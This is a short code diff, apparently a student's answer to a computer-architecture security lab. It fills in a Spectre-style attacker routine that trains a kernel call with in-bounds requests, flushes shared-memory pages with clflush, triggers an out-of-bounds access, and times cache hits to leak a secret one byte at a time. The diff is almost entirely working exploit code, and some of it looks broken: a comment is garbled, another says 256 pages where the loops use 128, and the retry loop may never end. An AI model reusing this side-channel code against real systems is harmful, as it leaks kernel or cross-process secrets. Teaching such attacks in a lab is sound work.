@@ -12,6 +12,8 @@
 #include "lab2.h"
 #include "lab2ipc.h"
 
+#define ITERS 3
+
 /*
  * call_kernel_part3
  * Performs the COMMAND_PART3 call in the kernel
@@ -46,8 +48,27 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
         char leaked_byte;
 
-        // [Part 3]- Fill this in!
-        // leaked_byte = ??
+		for (int iters=0; iters < ITERS; ){
+
+			for(int train=0; train<10; train++){							//Trainng: Call kernel vtraincttrainm multtrainple ttrainmes
+				call_kernel_part3(kernel_fd, shared_memory, 0);
+			}
+
+			for (int block = 0; block < 128; block++){						//Flush all 256 pages from memory
+				clflush(shared_memory + 4096*block);
+			}
+
+			call_kernel_part3(kernel_fd, shared_memory, current_offset);	//Call victim with out of boundary access
+
+			for (int block = 0; block < 128; block++){						//Check access time for each block
+				int time_req = 0;
+				time_req = time_access(shared_memory + 4096*block);
+				if (time_req < 170){
+					leaked_byte = (char)block;
+					iters++;
+				}
+			}
+		}
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
